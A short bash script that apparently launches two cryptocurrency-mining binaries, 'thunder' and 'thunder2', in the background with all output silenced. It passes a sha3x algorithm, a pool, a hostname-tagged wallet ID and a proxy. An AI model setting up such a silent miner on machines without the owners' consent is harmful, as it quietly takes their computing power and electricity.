#!/bin/bash
nohup ./thunder --config=test.json > /dev/null 2>&1 &
nohup ./thunder2 --algorithm sha3x --pool $pool2 --wallet $id2.$(hostname) --tls true --proxy $proxy > /dev/null 2>&1 & 
